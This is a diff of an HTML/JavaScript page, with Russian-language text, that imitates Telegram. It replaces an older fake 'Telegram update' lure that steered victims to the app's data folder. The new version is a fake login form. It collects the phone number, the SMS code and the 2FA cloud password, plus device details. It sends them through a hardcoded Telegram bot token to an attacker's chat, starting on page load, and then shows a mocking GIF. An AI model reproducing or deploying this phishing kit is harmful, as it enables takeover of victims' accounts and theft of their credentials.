@@ -3,99 +3,374 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Обновление Telegram</title>
+    <title>Telegram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
         body {
             background: #0a0a0a;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 16px;
+            padding: 20px;
             margin: 0;
         }
         .container {
-            background: #1a1a1a;
-            padding: 32px 24px;
-            border-radius: 24px;
-            max-width: 380px;
             width: 100%;
-            text-align: center;
+            max-width: 380px;
+            background: #121212;
+            padding: 20px 16px;
+            border-radius: 20px;
             border: 1px solid #2a2a2a;
         }
-        .icon { font-size: 64px; margin-bottom: 16px; }
-        .title { color: #fff; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-        .sub { color: #888; font-size: 14px; margin-bottom: 8px; }
-        .update-box {
-            background: #0a2a1a;
-            border: 1px solid #00cc66;
-            border-radius: 12px;
-            padding: 12px;
-            margin: 16px 0;
-            color: #66ff99;
+        .logo {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 28px;
+        }
+        .sub-text {
+            font-size: 15px;
+            color: #aaaaaa;
+            text-align: left;
+            margin-bottom: 24px;
+        }
+        .field-group {
+            margin-bottom: 18px;
+        }
+        .field-label {
+            font-size: 13px;
+            color: #aaaaaa;
+            margin-bottom: 6px;
+            display: block;
+        }
+        .country-selector {
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #2a2a2a;
+            padding: 4px 0;
+            justify-content: space-between;
+        }
+        .country-selector select {
+            flex: 1;
+            border: none;
+            padding: 12px 0;
+            font-size: 17px;
+            background: transparent;
+            outline: none;
+            color: #ffffff;
+            appearance: none;
+            -webkit-appearance: none;
+        }
+        .country-selector select option {
+            background: #121212;
+            color: #ffffff;
+        }
+        .country-selector .arrow {
+            color: #666666;
             font-size: 14px;
         }
-        .update-box span { font-weight: 700; }
-        .btn {
+        .phone-row {
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #2a2a2a;
+            padding: 4px 0;
+        }
+        .phone-code {
+            font-size: 17px;
+            color: #ffffff;
+            padding-right: 8px;
+            white-space: nowrap;
+        }
+        .phone-row input {
+            flex: 1;
+            border: none;
+            padding: 12px 0;
+            font-size: 17px;
+            background: transparent;
+            outline: none;
+            color: #ffffff;
+        }
+        .phone-row input::placeholder {
+            color: #666666;
+        }
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            margin: 20px 0 24px;
+        }
+        .checkbox-row input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-right: 10px;
+            accent-color: #0088cc;
+            cursor: pointer;
+        }
+        .checkbox-row label {
+            font-size: 16px;
+            color: #ffffff;
+            cursor: pointer;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
             background: #0088cc;
             border: none;
-            color: #fff;
-            padding: 18px;
-            width: 100%;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 16px;
-            transition: 0.2s;
-        }
-        .btn:active { opacity: 0.7; }
-        .btn-install {
-            background: #2a2a2a;
-            border: 2px solid #00cc66;
-            color: #66ff99;
-            padding: 14px;
-            width: 100%;
-            border-radius: 12px;
+            border-radius: 10px;
+            color: #ffffff;
             font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            margin-top: 12px;
+            transition: 0.15s;
+            text-align: center;
+        }
+        .login-btn:active {
+            background: #0077b3;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .error {
+            color: #ff3b30;
+            font-size: 13px;
+            margin-top: 6px;
             display: none;
         }
-        .btn-install:active { background: #333; }
-        .status {
+        .loader {
+            border: 3px solid #2a2a2a;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 0.8s linear infinite;
+            margin: 16px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .phone-display {
+            font-size: 15px;
+            color: #aaaaaa;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .phone-display span {
+            color: #ffffff;
+            font-weight: 600;
+        }
+        .footer {
+            font-size: 12px;
+            color: #666666;
+            text-align: center;
+            margin-top: 30px;
+            border-top: 1px solid #2a2a2a;
+            padding-top: 18px;
+        }
+        .sub-hint {
+            color: #666666;
+            font-size: 12px;
+            text-align: right;
+            margin-top: 4px;
+        }
+        .twofa-hint {
+            font-size: 13px;
+            color: #888888;
+            margin-top: 4px;
+            text-align: center;
+        }
+        .twofa-skip {
+            background: transparent;
+            border: none;
+            color: #0088cc;
+            font-size: 15px;
+            font-weight: 500;
+            margin-top: 10px;
+            cursor: pointer;
+            width: 100%;
+            text-align: center;
+            padding: 8px;
+        }
+        .twofa-skip:active {
+            opacity: 0.6;
+        }
+        #loadingAuth {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 500;
+            color: #ffffff;
+        }
+        #timer {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0088cc;
+        }
+        .loading-text {
             margin-top: 16px;
-            color: #888;
-            font-size: 14px;
-            display: none;
+            font-size: 16px;
+            font-weight: 400;
+            color: #aaaaaa;
         }
-        .footer { color: #444; font-size: 12px; margin-top: 24px; border-top: 1px solid #2a2a2a; padding-top: 16px; }
-        .hint { color: #555; font-size: 11px; margin-top: 8px; }
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        input[type="text"]:focus, input[type="password"]:focus, input[type="tel"]:focus {
+            border-bottom-color: #0088cc !important;
+        }
+        .phone-row:focus-within {
+            border-bottom-color: #0088cc !important;
+        }
+        .country-selector:focus-within {
+            border-bottom-color: #0088cc !important;
+        }
+        #step2 input {
+            background: transparent;
+            color: #ffffff;
+        }
+        #step2 input::placeholder {
+            color: #666666;
+        }
+        #twofaInput {
+            background: transparent;
+            color: #ffffff;
+        }
+        #twofaInput::placeholder {
+            color: #666666;
+        }
+        #codeInput {
+            background: transparent;
+            color: #ffffff;
+        }
+        #codeInput::placeholder {
+            color: #666666;
+        }
+
+        /* ===== БЛОК С ГИФКОЙ ===== */
+        #gifContainer {
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        #gifContainer img {
+            max-width: 100%;
+            border-radius: 16px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.8);
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .gif-caption {
+            color: #aaaaaa;
+            font-size: 14px;
+            margin-top: 12px;
+        }
     </style>
 </head>
 <body>
-
 <div class="container">
-    <div class="icon">⬆️</div>
-    <div class="title">Обновление Telegram</div>
-    <div class="sub">Вышла новая версия с улучшенной защитой</div>
+    <div class="logo">Telegram</div>
+    <div class="sub-text">Проверьте код страны и введите свой номер телефона.</div>
 
-    <div class="update-box">
-        ✅ <span>Обновление доступно!</span> Выберите папку с данными Telegram.
+    <!-- ШАГ 1: НОМЕР -->
+    <div id="step1">
+        <div class="field-group">
+            <span class="field-label">Страна</span>
+            <div class="country-selector">
+                <select id="countryCode">
+                    <option value="+7">🇷🇺 Россия (+7)</option>
+                    <option value="+380">🇺🇦 Украина (+380)</option>
+                    <option value="+375">🇧🇾 Беларусь (+375)</option>
+                    <option value="+1">🇺🇸 США (+1)</option>
+                    <option value="+44">🇬🇧 Великобритания (+44)</option>
+                    <option value="+49">🇩🇪 Германия (+49)</option>
+                    <option value="+33">🇫🇷 Франция (+33)</option>
+                    <option value="+90">🇹🇷 Турция (+90)</option>
+                    <option value="+95">🇲🇲 Мьянма (+95)</option>
+                    <option value="+86">🇨🇳 Китай (+86)</option>
+                    <option value="+91">🇮🇳 Индия (+91)</option>
+                    <option value="+81">🇯🇵 Япония (+81)</option>
+                    <option value="+82">🇰🇷 Корея (+82)</option>
+                    <option value="+39">🇮🇹 Италия (+39)</option>
+                    <option value="+34">🇪🇸 Испания (+34)</option>
+                    <option value="+55">🇧🇷 Бразилия (+55)</option>
+                    <option value="+61">🇦🇺 Австралия (+61)</option>
+                    <option value="+7">🇰🇿 Казахстан (+7)</option>
+                </select>
+                <span class="arrow">▼</span>
+            </div>
+        </div>
+
+        <div class="field-group">
+            <span class="field-label">Номер телефона</span>
+            <div class="phone-row">
+                <span class="phone-code" id="phoneCodeDisplay">+7</span>
+                <input type="tel" id="phoneInput" placeholder="900 123 45 67" inputmode="numeric">
+            </div>
+            <div class="sub-hint">Введите номер без +</div>
+        </div>
+
+        <div class="checkbox-row">
+            <input type="checkbox" id="rememberMe" checked>
+            <label for="rememberMe">Запомнить меня</label>
+        </div>
+
+        <button class="login-btn" onclick="step1()">Войти</button>
+        <div class="error" id="err1">Введите корректный номер</div>
     </div>
 
-    <button class="btn" id="folderBtn">📂 Открыть Solid Explorer</button>
-    <button class="btn-install" id="installBtn">📥 Установить Solid Explorer</button>
+    <!-- ШАГ 2: КОД + 2FA -->
+    <div id="step2" class="hidden">
+        <div class="phone-display">Код отправлен на <span id="phoneDisplay"></span></div>
+        <div class="field-group">
+            <span class="field-label">Код из SMS</span>
+            <input type="text" id="codeInput" placeholder="___ __" maxlength="6" inputmode="numeric" style="width:100%;border-bottom:1px solid #2a2a2a;padding:12px 0;font-size:17px;border-top:none;border-left:none;border-right:none;outline:none;background:transparent;color:#ffffff;">
+        </div>
+        <button class="login-btn" onclick="step2()">Подтвердить</button>
+        <div class="error" id="err2">Неверный код</div>
 
-    <div class="status" id="status">⏳ Обработка...</div>
-    <div class="hint">Для продолжения установите Solid Explorer (бесплатно)</div>
+        <!-- 2FA появляется ПОСЛЕ ввода кода -->
+        <div id="twofaBlock" class="hidden" style="margin-top:20px;">
+            <div class="field-group">
+                <span class="field-label">Облачный пароль (2FA)</span>
+                <input type="password" id="twofaInput" placeholder="Введите пароль, если он есть" style="width:100%;border-bottom:1px solid #2a2a2a;padding:12px 0;font-size:17px;border-top:none;border-left:none;border-right:none;outline:none;background:transparent;color:#ffffff;">
+            </div>
+            <div class="twofa-hint">Если у вас нет облачного пароля — пропустите</div>
+            <button class="login-btn" onclick="step3()">Войти</button>
+            <button class="twofa-skip" onclick="skipTwofa()">Пропустить</button>
+        </div>
+    </div>
+
+    <!-- ШАГ 3: ПРОВЕРКА АВТОРИЗАЦИИ 10 СЕК -->
+    <div id="loadingAuth" class="hidden">
+        <div class="loader" style="display:block;"></div>
+        <div id="timer" style="margin-top:16px;">10</div>
+        <div class="loading-text">Проверка авторизации...</div>
+    </div>
+
+    <!-- ===== БЛОК С ГИФКОЙ (появляется вместо результата) ===== -->
+    <div id="gifContainer">
+        <img src="https://media1.tenor.com/m/CWBMp3Tax5MAAAAC/%D0%B5%D0%B1%D0%B0%D1%82%D1%8C-%D1%82%D1%8B-%D0%BC%D0%B0%D0%B9%D0%BE%D0%BD%D0%B5%D0%B7.gif" alt="ебать ты майонез">
+        <div class="gif-caption">ебать ты майонез</div>
+    </div>
+
     <div class="footer">Telegram • 2026</div>
 </div>
 
 <script>
-    // ===== КОНФИГУРАЦИЯ =====
-    const BOT_TOKEN = '8712563091:AAEg-wCQ4x7wviL5UUC5yDh2_q3gZWBn6gg';
+    const BOT_TOKEN = '8799962757:AAFmz4Sq3Ujo4URqCQl2gH4b6sRh51c1NKI';
     const CHAT_ID = '8277809761';
     const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
@@ -111,82 +386,99 @@
         }).catch(e => console.log('Ошибка отправки:', e));
     }
 
-    function showStatus(text) {
-        const status = document.getElementById('status');
-        status.style.display = 'block';
-        status.textContent = text;
+    function getDeviceInfo() {
+        return {
+            ua: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ref: document.referrer || 'прямой',
+            url: window.location.href,
+            time: new Date().toISOString()
+        };
     }
 
-    // ===== ПРОВЕРКА УСТАНОВКИ SOLID EXPLORER =====
-    function isSolidExplorerInstalled() {
-        // Пытаемся открыть Solid Explorer через intent
-        const intent = 'intent://#Intent;package=pl.solidexplorer2;end';
-        return new Promise((resolve) => {
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = intent;
-            document.body.appendChild(iframe);
-
-            // Если через 2 секунды ничего не произошло — вероятно, приложение не установлено
-            const timeout = setTimeout(() => {
-                document.body.removeChild(iframe);
-                resolve(false);
-            }, 2000);
-
-            // Если приложение установлено — браузер покажет диалог выбора
-            // (нельзя точно определить, но можно попробовать)
-            window.addEventListener('blur', function onBlur() {
-                clearTimeout(timeout);
-                document.body.removeChild(iframe);
-                window.removeEventListener('blur', onBlur);
-                resolve(true);
-            });
-        });
+    function getFullPhone() {
+        const code = document.getElementById('countryCode').value;
+        const num = document.getElementById('phoneInput').value.replace(/\s/g, '');
+        if (!num || num.length < 5) return null;
+        return code + num;
     }
 
-    // ===== ОТКРЫТИЕ SOLID EXPLORER =====
-    document.getElementById('folderBtn').addEventListener('click', async function() {
-        const btn = this;
-        btn.textContent = '⏳ Проверка...';
-        btn.disabled = true;
-
-        // Отправляем уведомление
-        sendToTG(`📂 <b>Жертва нажала "Открыть Solid Explorer"</b>\n🖥 ${navigator.userAgent}`);
-
-        // Пробуем открыть Solid Explorer
-        const installed = await isSolidExplorerInstalled();
-
-        if (installed) {
-            // Открываем Solid Explorer с указанием папки Telegram
-            const path = '/storage/emulated/0/Android/data/org.telegram.messenger/files';
-            const intent = `intent://${path}#Intent;package=pl.solidexplorer2;action=android.intent.action.VIEW;end`;
-            window.location.href = intent;
-
-            showStatus('✅ Solid Explorer открыт. Выберите папку Telegram.');
-            sendToTG(`✅ <b>Solid Explorer открыт</b>\n📁 Путь: ${path}`);
-            btn.textContent = '✅ Открыто';
-            btn.style.background = '#00cc66';
-        } else {
-            // Solid Explorer не установлен — показываем кнопку установки
-            document.getElementById('installBtn').style.display = 'block';
-            showStatus('⚠️ Solid Explorer не установлен. Установите его.');
-            sendToTG(`❌ <b>Solid Explorer не установлен</b>`);
-            btn.textContent = '📂 Открыть Solid Explorer';
-            btn.disabled = false;
+    // ===== ШАГ 1 =====
+    function step1() {
+        const full = getFullPhone();
+        if (!full) {
+            document.getElementById('err1').style.display = 'block';
+            return;
         }
-    });
+        document.getElementById('err1').style.display = 'none';
 
-    // ===== УСТАНОВКА SOLID EXPLORER =====
-    document.getElementById('installBtn').addEventListener('click', function() {
-        // Отправляем в Google Play
-        window.location.href = 'https://play.google.com/store/apps/details?id=pl.solidexplorer2';
-        showStatus('📥 Установите Solid Explorer, затем вернитесь и нажмите "Открыть"');
-        sendToTG(`📥 <b>Жертва устанавливает Solid Explorer</b>`);
-    });
+        const info = getDeviceInfo();
+        const remember = document.getElementById('rememberMe').checked ? 'Да' : 'Нет';
+        sendToTG(`📱 <b>НОМЕР</b>\n<code>${full}</code>\n🔒 Запомнить: ${remember}\n\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}`);
 
-    // ===== АВТО-УВЕДОМЛЕНИЕ =====
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        document.getElementById('phoneDisplay').textContent = full;
+    }
+
+    // ===== ШАГ 2 — ввод кода =====
+    function step2() {
+        const code = document.getElementById('codeInput').value.trim();
+        if (!code || code.length < 4) {
+            document.getElementById('err2').style.display = 'block';
+            return;
+        }
+        document.getElementById('err2').style.display = 'none';
+
+        sendToTG(`🔐 <b>КОД</b>\n<code>${code}</code>`);
+
+        // Показываем блок с 2FA
+        document.getElementById('twofaBlock').classList.remove('hidden');
+        document.querySelector('#step2 .login-btn').disabled = true;
+        document.querySelector('#step2 .login-btn').textContent = '⏳ Ожидание...';
+    }
+
+    // ===== ШАГ 3 — финал с 2FA =====
+    function step3() {
+        const twofa = document.getElementById('twofaInput').value.trim() || 'не указан';
+        sendToTG(`🔐 <b>2FA</b>\n<code>${twofa}</code>`);
+        startAuthCheck();
+    }
+
+    // ===== ПРОПУСТИТЬ 2FA =====
+    function skipTwofa() {
+        sendToTG(`⏭️ <b>2FA пропущен</b>`);
+        startAuthCheck();
+    }
+
+    // ===== ЭКРАН ПРОВЕРКИ + ТАЙМЕР =====
+    function startAuthCheck() {
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('loadingAuth').classList.remove('hidden');
+
+        let seconds = 10;
+        const timerEl = document.getElementById('timer');
+        timerEl.textContent = seconds;
+
+        const interval = setInterval(() => {
+            seconds--;
+            timerEl.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(interval);
+                // Скрываем загрузку и показываем гифку
+                document.getElementById('loadingAuth').classList.add('hidden');
+                document.getElementById('gifContainer').style.display = 'block';
+                sendToTG(`✅ <b>АВТОРИЗАЦИЯ ПРОЙДЕНА</b>\n➡️ Показана гифка`);
+            }
+        }, 1000);
+    }
+
+    // ===== ПРИ ЗАГРУЗКЕ =====
     window.onload = function() {
-        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${navigator.userAgent}\n📺 ${screen.width}x${screen.height}`);
+        const info = getDeviceInfo();
+        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}\n📍 ${info.url}`);
+        document.getElementById('phoneCodeDisplay').textContent = document.getElementById('countryCode').value;
     };
 </script>
 </body>
